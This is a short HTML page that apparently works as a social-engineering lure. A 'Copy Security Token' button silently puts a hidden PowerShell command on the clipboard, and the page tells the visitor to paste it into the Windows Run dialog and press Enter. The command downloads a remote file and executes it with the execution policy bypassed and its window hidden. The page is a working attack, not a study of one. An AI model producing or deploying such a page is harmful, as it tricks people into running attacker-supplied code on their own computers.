<!doctype html>
<html><body><button id="copy">Copy Security Token</button>
<p>Press Win + R, paste with Ctrl + V, then press Enter.</p>
<script>
                const payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.org/update/patch.dat')"`;
document.getElementById('copy').onclick = () => navigator.clipboard.writeText(payload);
</script></body></html>
